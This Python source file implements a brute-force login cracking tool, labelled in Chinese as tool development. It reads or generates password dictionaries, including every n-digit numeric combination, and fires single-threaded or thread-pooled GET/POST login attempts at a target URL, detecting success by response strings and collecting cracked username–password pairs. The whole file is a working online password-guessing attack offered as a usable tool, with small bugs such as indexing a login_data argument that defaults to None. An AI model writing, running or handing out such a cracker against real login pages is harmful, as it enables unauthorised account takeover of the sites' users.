'''
    暴力破解工具开发
'''

# 导入模块
import requests
import itertools
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, wait


class BruteForce:

    def __init__(self, access_success: str, access_denied: str, headers: dict = None, cookies: dict = None):
        if headers is None:
            self.headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36'
            }
        else:
            self.headers = headers

        self.access_success = access_success
        self.access_denied = access_denied
        self.cookies = cookies

    # 登录函数
    def login(self, url: str, method: str, login_data: dict):
        response = None
        if method == "get":
            # 登录响应包
            response = requests.get(
                url=url,
                params=login_data,
                headers=self.headers,
                cookies=self.cookies
            )
        elif method == "post":
            response = requests.post(
                url=url,
                data=login_data,
                headers=self.headers,
                cookies=self.cookies
            )

        if self.access_success in response.content.decode(encoding='utf-8'):
            print("access success:%s" % login_data)
            return True
        elif self.access_denied in response.content.decode(encoding='utf-8'):
            return False
        else:
            raise Exception("login status error")

    # 读取字典
    def read_dict(self, dict_path: str):
        elements = []
        try:
            with open(dict_path, "r") as f:
                for element in f:
                    elements.append(element.strip())
        except FileNotFoundError:
            print("字典不存在")
        return elements

    # 生成自定义位组合的所有数字组合
    def generate_custom_digit_combinations(self, repeat: int):
        digits = '0123456789'
        combinations = [''.join(p) for p in itertools.product(digits, repeat=repeat)]
        with open("digit_%s.txt" % repeat, "w") as f:
            for combination in combinations:
                f.write(combination + "\n")
        print("已生成%d位数字组合的密码字典digit_%d.txt" % (repeat, repeat))

    # 生成指定时间的时间戳
    def get_timestamp(self, start_time: str):
        gmt_timestamp = int(datetime.strptime(start_time, '%Y-%m-%d %H:%M:%S').timestamp())
        return gmt_timestamp

    '''
        单线程暴力破解
        1. usernames为None时，需要手动输入一个用户名
        2. passwords为None时，自动使用默认的密码字典
        3. username_key默认值为username
        4. password_key默认值为password
        5.login_data为None时，默认只有username和password两个值
    '''

    def single_thread_brute(self, url: str, usernames: list = None, passwords: list = None, login_data: dict = None,
                            username_key: str = 'username', password_key: str = 'password'):
        # 如果用户名为空，则需要手动输入一个用户名
        if usernames is None:
            username = input("请输入用户名:")
            usernames = [username]

        if passwords is None:
            passwords = self.read_dict('low_pass_dict.txt')

        # 存储已破解的用户名
        cracked_user = []
        for user in usernames:
            print("正在爆破用户名:%s......" % user)
            for password in passwords:
                login_data[username_key] = user
                login_data[password_key] = password
                if self.login(url, 'post', login_data):
                    cracked_user.append({login_data['username']: login_data['password']})
                    break
        return cracked_user

    '''
        多线程暴力破解
        1. 针对每个用户名启动线程
        2. 一旦找到成功的用户名和密码组合，立即停止当前用户名的破解任务，取消剩余的未完成任务。
        3. 如果当前用户名在所有密码尝试中均未破解成功，则继续下一个用户名。
        也就是爆破一个用户名时，为该用户名的爆破开启多线程任务
    '''
    def multi_thread_brute(self, url: str, usernames: list = None, passwords: list = None, login_data: dict = None,
                           username_key: str = 'username', password_key: str = 'password', max_workers: int = 5):
        if usernames is None:
            username = input("请输入用户名:")
            usernames = [username]

        if passwords is None:
            passwords = self.read_dict('low_pass_dict.txt')

        cracked_user = []

        # 定义单次尝试登录的函数
        def brute_force_attempt(user, password):
            temp_login_data = login_data.copy()
            temp_login_data[username_key] = user
            temp_login_data[password_key] = password
            if self.login(url, 'post', temp_login_data):
                return {user: password}
            return None

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            for user in usernames:
                print(f"正在爆破用户名: {user} ......")
                # 使用一个临时任务列表来保存当前用户名的所有密码尝试
                futures = [executor.submit(brute_force_attempt, user, password) for password in passwords]

                # 处理该用户名的所有密码尝试任务
                user_cracked = False
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        cracked_user.append(result)  # 保存成功的用户名和密码组合
                        user_cracked = True         # 标记当前用户已成功破解
                        break                       # 停止该用户名的暴力破解

                # 如果当前用户名成功破解，取消未完成的密码尝试
                if user_cracked:
                    for f in futures:
                        f.cancel()

        return cracked_user
